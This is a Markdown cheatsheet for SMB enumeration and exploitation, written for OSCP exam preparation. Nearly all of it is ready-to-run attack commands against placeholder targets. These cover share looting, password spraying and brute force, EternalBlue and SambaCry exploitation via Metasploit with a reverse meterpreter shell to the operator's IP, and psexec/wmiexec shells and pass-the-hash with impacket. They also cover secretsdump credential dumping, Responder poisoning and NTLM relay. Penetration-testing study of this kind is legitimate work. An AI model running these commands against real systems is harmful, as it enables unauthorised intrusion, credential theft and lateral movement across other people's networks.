# SMB Enumeration Cheatsheet

> **OSCP Preparation** - Quick reference for SMB enumeration & exploitation

---

## Table of Contents

1. [Initial Discovery](#1-initial-discovery)
2. [Version & OS Detection](#2-version--os-detection)
3. [Enumeration by Target Type](#3-enumeration-by-target-type)
4. [Null Session Testing](#4-null-session-testing)
5. [Share Enumeration](#5-share-enumeration)
6. [Credential-based Access](#6-credential-based-access)
7. [Brute Force](#7-brute-force)
8. [Exploitation](#8-exploitation)
9. [Post-Exploitation](#9-post-exploitation)
10. [SMB Relay Attacks](#10-smb-relay-attacks)
11. [Advanced Enumeration](#11-advanced-enumeration)
12. [Vulnerability Checks](#12-vulnerability-checks)
13. [File Transfer via SMB](#13-file-transfer-via-smb)
14. [Windows Native Commands](#14-windows-native-commands)
15. [Quick Commands Reference](#15-quick-commands-reference)

---

## 1. Initial Discovery

### Nmap Scan
```bash
# Basic SMB port scan
nmap -sV -sC -p 139,445 <IP>

# Full port scan if SMB not found
nmap -sV -p- --min-rate 1000 <IP>

# UDP NetBIOS check
nmap -sU -p 137 <IP>
```

### NetExec Quick Check
```bash
# Check if SMB is accessible
netexec smb <IP>
```

---

## 2. Version & OS Detection

```bash
# Nmap SMB scripts
nmap --script smb-os-discovery -p 445 <IP>
nmap --script smb-protocols -p 445 <IP>

# Vulnerability scan
nmap --script smb-vuln* -p 445 <IP>

# EternalBlue check (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 <IP>
```

> **Tip:** SMBv1 active → Check for EternalBlue vulnerability

---

## 3. Enumeration by Target Type

### Linux (Samba)

```bash
# enum4linux-ng (recommended)
enum4linux-ng -A <IP>

# Classic enum4linux
enum4linux -a <IP>

# RID brute-force if enumeration is blocked
netexec smb <IP> --rid-brute
```

### Windows

```bash
# List shares
netexec smb <IP> --shares

# List users
netexec smb <IP> --users

# List groups
netexec smb <IP> --groups

# Password policy
netexec smb <IP> --pass-pol
```

---

## 4. Null Session Testing

```bash
# smbclient null session
smbclient -L //<IP> -N

# netexec null session
netexec smb <IP> -u '' -p ''

# rpcclient null session
rpcclient -U '' -N <IP>

# Inside rpcclient:
enumdomusers
enumdomgroups
querydispinfo
getdompwinfo
```

---

## 5. Share Enumeration

### List Shares
```bash
# smbclient
smbclient -L //<IP> -N

# smbmap
smbmap -H <IP>
smbmap -H <IP> -u <USER> -p <PASS>

# netexec
netexec smb <IP> --shares
netexec smb <IP> -u <USER> -p <PASS> --shares
```

### Access Shares
```bash
# Connect to share (null session)
smbclient //<IP>/<SHARE> -N

# Connect with credentials
smbclient //<IP>/<SHARE> -U <USER>%<PASS>

# Inside smbclient:
recurse ON
prompt OFF
mget *
```

### Download Files
```bash
# Quick recursive download
smbget -R smb://<IP>/<SHARE> --guest

# With credentials
smbget -R smb://<IP>/<SHARE> -U <USER>%<PASS>
```

> **Look for:** `.txt`, `.conf`, `.xml`, `.bak`, `.ps1`, `.sh`, `.kdbx`
> **Keywords:** `password`, `cred`, `config`, `backup`

---

## 6. Credential-based Access

### Validate Credentials
```bash
# Basic auth check
netexec smb <IP> -u <USER> -p <PASS>

# With NTLM hash
netexec smb <IP> -u <USER> -H <HASH>
```

> **Output shows `(Pwn3d!)`** → Admin access confirmed

### Check Admin Access
```bash
# Check accessible shares
netexec smb <IP> -u <USER> -p <PASS> --shares

# If ADMIN$ and C$ are listed → Admin confirmed
```

### Spider Shares (File Search)
```bash
# Crawl all shares
netexec smb <IP> -u <USER> -p <PASS> -M spider_plus
```

---

## 7. Brute Force

### Password Spray
```bash
# One password, multiple users
netexec smb <IP> -u users.txt -p 'Password1'
```

### Brute Force
```bash
# Multiple users and passwords
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success

# Hydra alternative
hydra -L users.txt -P passwords.txt <IP> smb
```

> **⚠️ Warning:** Check lockout policy before brute-forcing!
> ```bash
> rpcclient $> getdompwinfo
> ```

---

## 8. Exploitation

### EternalBlue (MS17-010)
```bash
# Check vulnerability
nmap --script smb-vuln-ms17-010 -p 445 <IP>

# Metasploit exploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <YOUR_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### Get Shell with Valid Creds

```bash
# Impacket PsExec (recommended)
impacket-psexec <USER>:<PASS>@<IP>

# Alternative methods if PsExec fails
impacket-wmiexec <USER>:<PASS>@<IP>
impacket-smbexec <USER>:<PASS>@<IP>
impacket-atexec <USER>:<PASS>@<IP>

# Pass-the-Hash
impacket-psexec -hashes :<NTLM> <USER>@<IP>
```

---

## 9. Post-Exploitation

### Dump Credentials
```bash
# Secrets dump (SAM, LSA, NTDS)
impacket-secretsdump <USER>:<PASS>@<IP>

# With hash
impacket-secretsdump -hashes :<NTLM> <USER>@<IP>
```

### Pass-the-Hash
```bash
# netexec with hash
netexec smb <IP> -u <USER> -H <NTLM>

# Impacket with hash
impacket-psexec -hashes :<NTLM> <USER>@<IP>
```

### Network Pivoting
```bash
# Scan subnet with hash
netexec smb <SUBNET>/24 -u <USER> -H <NTLM>
```

---

## 10. SMB Relay Attacks

> **⚠️ Prerequisite:** SMB signing disabled on target + network access

### Responder (LLMNR/NBT-NS Poisoning)
```bash
# Start Responder on interface
responder -I eth0 -dwPv

# Options:
# -I : Interface
# -d : Enable DHCP poison
# -w : Start WPAD rogue server
# -P : Force NTLM auth
# -v : Verbose
```

### NTLM Relay
```bash
# Basic relay to target
impacket-ntlmrelayx -tf targets.txt

# With command execution
impacket-ntlmrelayx -tf targets.txt -c 'whoami'

# Dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -i
```

> **Note:** Requires targets file with IPs to relay to

---

## 11. Advanced Enumeration

### smbmap Recursive
```bash
# Recursive share listing
smbmap -H <IP> -R

# With credentials
smbmap -H <IP> -u <USER> -p <PASS> -R

# Search for specific files
smbmap -H <IP> -R -A '*.txt,*.xml,*.conf'
```

### Kerberos Authentication
```bash
# NetExec with Kerberos (-k flag)
netexec smb <IP> -u <USER> -p <PASS> -k

# With KDC host specified
netexec smb <IP> -u <USER> -p <PASS> -k --kdcHost <DC_IP>

# Get TGT first (impacket)
impacket-getTGT <DOMAIN>/<USER>:<PASS>
export KRB5CCNAME=<USER>.ccache
netexec smb <IP> -u <USER> -k --use-kcache
```

---

## 12. Vulnerability Checks

### PrintNightmare (CVE-2021-34527)
```bash
# Python scanner
python3 CVE-2021-34527.py <IP>

# PowerShell check (from Windows)
Get-PrinterDriver | Where-Object {$_.IsPackageAware -eq $false}

# Impacket check
impacket-rpcdump <IP> | grep -i print
```

### PrintSpooler Service Check
```bash
# Check if PrintSpooler is running
rpcdump.py <IP> | grep -i spoolss

# Metasploit check
msfconsole
use auxiliary/scanner/smb/smb_enum_print_spooler
set RHOSTS <IP>
run
```

### Samba Vulnerabilities
```bash
# CVE-2021-44142 (Samba 4.13-4.15)
# Check version first
nmap --script smb-os-discovery -p 445 <IP>

# If vulnerable version, exploit available:
# https://github.com/hrsman/Samba-CVE-2021-44142

# SambaCry (CVE-2017-7494)
nmap --script smb-vuln-cve-2017-7494 -p 445 <IP>

# is_known_pipename
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS <IP>
run
```

---

## 13. File Transfer via SMB

### Upload Files
```bash
# smbclient upload
smbclient //<IP>/<SHARE> -U <USER>%<PASS> -c 'put /local/file.txt remote/file.txt'

# mount and copy
mount -t cifs //<IP>/<SHARE> /mnt/smb -o username=<USER>,password=<PASS>
cp /local/file.txt /mnt/smb/
umount /mnt/smb

# impacket-smbserver (for receiving)
impacket-smbserver share /path/to/share -smb2support

# On target: copy \\<YOUR_IP>\share\file.txt C:\
```

### Download with Filter
```bash
# Download specific extensions only
smbclient //<IP>/<SHARE> -N -c 'recurse; prompt OFF; mget *.txt *.xml *.conf'

# Using smbmap to download
smbmap -H <IP> --download '<SHARE>/path/to/file.txt'
```

---

## 14. Windows Native Commands

> **Useful when you have a shell on a Windows machine**

### Basic Enumeration
```cmd
# List shares on remote machine
net view \\<IP>
net view \\<IP> /all

# List shares locally
net share

# Connect to share
net use \\<IP>\<SHARE> /user:<DOMAIN>\<USER> <PASS>

# Map to drive letter
net use Z: \\<IP>\<SHARE> /user:<DOMAIN>\<USER> <PASS>

# Disconnect
net use Z: /delete
```

### Domain Information
```cmd
# Domain users
net user /domain

# Domain groups
net group /domain

# Domain admins
net group "Domain Admins" /domain

# Password policy
net accounts /domain
```

### Pivoting from Windows
```powershell
# Find other machines
net view /domain
net view \\<COMPUTER_NAME>

# Check access to admin shares
Test-Path \\<IP>\C$
Test-Path \\<IP>\ADMIN$

# Copy file to remote
Copy-Item C:\file.txt \\<IP>\C$\Users\Public\

# Execute remotely with WMI
wmic /node:<IP> /user:<DOMAIN>\<USER> /password:<PASS> process call create "cmd.exe /c whoami"
```

---

## 15. Quick Commands Reference

| Task | Command |
|------|---------|
| Quick SMB check | `netexec smb <IP>` |
| List shares | `netexec smb <IP> --shares` |
| List users | `netexec smb <IP> --users` |
| Null session | `smbclient -L //<IP> -N` |
| Connect share | `smbclient //<IP>/<SHARE> -N` |
| Download all | `smbget -R smb://<IP>/<SHARE> --guest` |
| Auth check | `netexec smb <IP> -u <USER> -p <PASS>` |
| Hash auth | `netexec smb <IP> -u <USER> -H <HASH>` |
| RID brute | `netexec smb <IP> --rid-brute` |
| PsExec | `impacket-psexec <USER>:<PASS>@<IP>` |
| Secrets dump | `impacket-secretsdump <USER>:<PASS>@<IP>` |
| SMB map | `smbmap -H <IP>` |
| SMB relay | `impacket-ntlmrelayx -tf targets.txt` |
| Responder | `responder -I eth0 -dwPv` |
| Recursive enum | `smbmap -H <IP> -R` |
| Kerberos auth | `netexec smb <IP> -u <USER> -p <PASS> -k` |
| PrintNightmare check | `rpcdump.py <IP> \| grep -i spoolss` |

---

## Common Errors

| Error | Meaning | Solution |
|-------|---------|----------|
| `NT_STATUS_PASSWORD_EXPIRED` | Password expired | Reset via Meterpreter shell |
| `NT_STATUS_ACCESS_DENIED` | C$/ADMIN$ denied | Try Pass-the-Hash or different user |
| `signing:False` | SMB signing disabled | Vulnerable to relay attacks |

---

## Tools Reference

- **netexec** (ex-crackmapexec) - Modern SMB enumeration
- **impacket** - Python SMB toolkit
- **smbclient** - Native Linux SMB client
- **smbmap** - SMB share enumerator
- **enum4linux/enum4linux-ng** - Samba enumeration
- **rpcclient** - RPC client for Windows

---

## GPP Passwords

If you find `Groups.xml` files:
```bash
# Decrypt GPP password
gpp-decrypt <hash_base64>
```

---

*Last updated: 2026-02-25 (v2.0 - Enriched Edition)*
